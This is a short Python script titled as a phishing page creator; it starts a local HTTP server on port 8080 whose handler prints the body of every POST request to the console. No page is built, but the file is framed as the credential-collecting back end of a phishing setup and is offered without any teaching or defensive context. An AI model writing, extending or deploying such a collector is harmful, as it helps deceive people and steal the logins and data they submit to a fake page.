# phishing_page_creator.py
import http.server
import socketserver
import threading

class CustomHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        print(post_data.decode())
        self.send_response(200)
        self.end_headers()

def start_server(port=8080):
    handler = CustomHandler
    server = socketserver.TCPServer(("", port), handler)
    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.start()
    print(f'Server started at localhost:{port}')

start_server()
